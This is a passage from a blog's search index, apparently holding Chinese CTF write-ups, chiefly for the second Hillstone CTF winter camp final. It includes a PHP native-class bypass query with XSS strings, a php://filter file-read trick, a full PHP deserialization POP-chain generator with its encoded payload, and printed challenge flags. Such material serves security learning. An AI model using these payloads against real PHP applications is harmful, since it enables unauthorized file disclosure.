class="hljs-number">0</span>]<br>digest = data.split(<span class="hljs-string">&quot;= &quot;</span>)[<span class="hljs-number">1</span>]<br><br><br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> Crypto.Hash <span class="hljs-keyword">import</span> SHA256<br><span class="hljs-keyword">import</span> itertools<br><br>ALPHABET = string.ascii_letters + string.digits<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getProof</span>(<span class="hljs-params">suffix,digest</span>):   <br><br>    <span class="hljs-comment">#print(f&quot;suffix: &#123;suffix&#125;\ndigest: &#123;digest&#125;&quot;)</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> itertools.product(ALPHABET,repeat=<span class="hljs-number">4</span>):<br>        prefix = <span class="hljs-string">&#x27;&#x27;</span>.join(i)<br>        guess =  suffix + prefix<br>        <span class="hljs-keyword">if</span> sha256(guess.encode()).hexdigest() == digest:<br>            <span class="hljs-comment">#print(f&quot;Find X<span class="hljs-doctag">XXX:</span> &#123;prefix&#125;&quot;)</span><br>            <span class="hljs-keyword">return</span> prefix<br>            <span class="hljs-keyword">break</span><br><br>x = getProof(suffix,digest)<br><span class="hljs-built_in">print</span>(x)<br></code></pre></td></tr></table></figure><p>给50条数据来训练AI，然后给10条邮件让判断是垃圾邮件还是好的邮件<br>不会机器学习，纯靠翻译自己去判断，10条全对就拿到flag了。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第2届山石CTF冬令营结营赛wp</title>
    <link href="/2023/02/05/%E7%AC%AC2%E5%B1%8A%E5%B1%B1%E7%9F%B3CTF%E5%86%AC%E4%BB%A4%E8%90%A5%E7%BB%93%E8%90%A5%E8%B5%9Bwp/"/>
    <url>/2023/02/05/%E7%AC%AC2%E5%B1%8A%E5%B1%B1%E7%9F%B3CTF%E5%86%AC%E4%BB%A4%E8%90%A5%E7%BB%93%E8%90%A5%E8%B5%9Bwp/</url>
    
    <content type="html"><![CDATA[<p><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/1.jpg"></p><h3 id="Primitive-php"><a href="#Primitive-php" class="headerlink" title="Primitive php"></a>Primitive php</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br>highlight_file(__FILE__);<br>//hint.php<br>foreach ($_GET <span class="hljs-keyword">as</span> $value) &#123;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/flag/&quot;</span>,$value))&#123;<br>        die(<span class="hljs-string">&quot;不可以看flag啦，阿sir&quot;</span>);<br>    &#125;<br><br>&#125;<br>$a = new $_GET[<span class="hljs-string">&#x27;class1&#x27;</span>]($_GET[<span class="hljs-string">&#x27;a&#x27;</span>]);$b = new $_GET[<span class="hljs-string">&#x27;class2&#x27;</span>]($_GET[<span class="hljs-string">&#x27;b&#x27;</span>]);<br><span class="hljs-keyword">if</span> ($a !== $b <span class="hljs-keyword">and</span> md5($a)===md5($b))<br>&#123;<br>    echo new $_GET[<span class="hljs-string">&#x27;class3&#x27;</span>]($_GET[<span class="hljs-string">&#x27;c&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>原生类绕过：参考：<a href="https://blog.csdn.net/qq_63928796/article/details/127786521">https://blog.csdn.net/qq_63928796/article/details/127786521</a><br><code>?class2=Exception&amp;b=&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt;&amp;class1=Exception&amp;a=&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt;&amp;class3=SplFileObject&amp;c=php://filter/convert.base64-encode/resource=hint.php</code><br>filter流伪协议读到源码<br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/1.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br>echo <span class="hljs-string">&quot;no hint&quot;</span>;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">blue</span><br>&#123;<br>    public $b1;<br>    public $b2;<br><br>    function <span class="hljs-built_in">eval</span>() &#123;<br>        echo new $this-&gt;b1($this-&gt;b2);<br>    &#125;<br><br>    public function __invoke()<br>    &#123;<br>        $this-&gt;b1-&gt;blue();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">red</span><br>&#123;<br>    public $r1;<br><br>    public function __destruct()<br>    &#123;<br>        echo $this-&gt;r1 . <span class="hljs-string">&#x27;0xff0000&#x27;</span>;<br>    &#125;<br><br>    public function execute()<br>    &#123;<br>        ($this-&gt;r1)();<br>    &#125;<br><br>    public function __call($a, $b)<br>    &#123;<br>        echo $this-&gt;r1-&gt;getFlag();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">white</span><br>&#123;<br>    public $w;<br><br>    public function __toString()<br>    &#123;<br>        $this-&gt;w-&gt;execute();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;hello&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">color</span><br>&#123;<br>    public $c1;<br><br>    public function execute()<br>    &#123;<br>        ($this-&gt;c1)();<br>    &#125;<br><br>    public function getFlag()<br>    &#123;<br>        echo file_get_contents($this-&gt;c1);<br>    &#125;<br><br>&#125;<br><br>unserialize($_POST[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><br></code></pre></td></tr></table></figure><p>反序列化构造payload<br>参考：<br><a href="https://blog.csdn.net/cosmoslin/article/details/123829951">https://blog.csdn.net/cosmoslin/article/details/123829951</a><br>构造伪协议读取flag<code>php://filter/convert.base64-encode/resource=flag.php</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">blue</span><br>&#123;<br>    public $b1;<br>    public $b2;<br><br>    public function __construct($b1)<br>    &#123;<br>        $this-&gt;b1 = $b1;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">red</span><br>&#123;<br>    public $r1;<br><br>    public function __construct($r1)<br>    &#123;<br>        $this-&gt;r1 = $r1;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">white</span><br>&#123;<br>    public $w;<br><br>    public function __construct($w)<br>    &#123;<br>        $this-&gt;w = $w;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">color</span><br>&#123;<br>    public $c1;<br><br>    public function __construct($c1)<br>    &#123;<br>        $this-&gt;c1 = $c1;<br>    &#125;<br><br>&#125;<br>$f = new color(<span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>);  <br>$e = new red($f);<br>$d = new blue($e);<br>$c = new color($d);<br>$b = new white($c);<br>$a = new red($b);<br>echo (urlencode(serialize($a)));<br></code></pre></td></tr></table></figure><p><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/2.png"><br><code>unserialize($_POST[&#39;cmd&#39;]);</code>post传参cmd<br>payload：<br><code>cmd=O%3A3%3A%22red%22%3A1%3A%7Bs%3A2%3A%22r1%22%3BO%3A5%3A%22white%22%3A1%3A%7Bs%3A1%3A%22w%22%3BO%3A5%3A%22color%22%3A1%3A%7Bs%3A2%3A%22c1%22%3BO%3A4%3A%22blue%22%3A2%3A%7Bs%3A2%3A%22b1%22%3BO%3A3%3A%22red%22%3A1%3A%7Bs%3A2%3A%22r1%22%3BO%3A5%3A%22color%22%3A1%3A%7Bs%3A2%3A%22c1%22%3Bs%3A52%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7Ds%3A2%3A%22b2%22%3BN%3B%7D%7D%7D%7D</code><br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/3.png"><br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/4.png"><br>:::tips<br>HSNCTF{537C532E-408B-FDCD-3E49-58E6FB578579}<br>:::</p><h3 id="extract"><a href="#extract" class="headerlink" title="extract"></a>extract</h3><p>用工具cloakify<br>kali：<br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/5.png"><br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/6.png"><br>打开保存的文件<br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/7.png"><br>改后缀zip<br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/8.png"><br>zip套娃，文件名递减1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zipfile<br><br>count = <span class="hljs-number">2331</span><br><span class="hljs-keyword">while</span> count&gt;<span class="hljs-number">0</span>:<br>    path = <span class="hljs-string">&#x27;f&#x27;</span>+ <span class="hljs-built_in">str</span>(count) + <span class="hljs-string">&#x27;.zip&#x27;</span><br>    folder_abs = <span class="hljs-string">&#x27;.&#x27;</span><br><br>    zip_file = zipfile.ZipFile(path)<br>    zip_list = zip_file.namelist()<br><br>    <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> zip_list:<br>        zip_file.extract(f, folder_abs)<br>     <br>    zip_file.close()<br>    count -= <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>得到<img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/9.png"><br>:::tips<br>hsnctf{66eec912-e9ce-4e1d-ac54-ecea075dcb96}<br>:::</p><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/10.png"><br>:::tips<br>hsnctf{welcome_to_hsnctf}<br>:::</p><h3 id="外星电波"><a href="#外星电波" class="headerlink" title="外星电波~"></a>外星电波~</h3><p><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/11.png"><br>得到一个加密的压缩包<br>NTFS数据流加密<br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/12.png"><br>得到音频，导出，sstv读<br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/13.png"><br>解压缩包得到flag<br>:::tips<br>hsnctf{70995fb0-eb60-0787-f305-77066aeb6730}<br>:::</p><h3 id="daobudao"><a href="#daobudao" class="headerlink" title="daobudao"></a>daobudao</h3><p><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/14.png"><br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/15.png"><br>:::tips<br>hsnctf{g00d_luck_have_fun}<br>:::</p><h3 id="S7-analysis"><a href="#S7-analysis" class="headerlink" title="S7_analysis"></a>S7_analysis</h3><p>随便翻翻，看见一个stop<br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/16.png"><br>:::tips<br> hsnctf{399}<br>:::</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
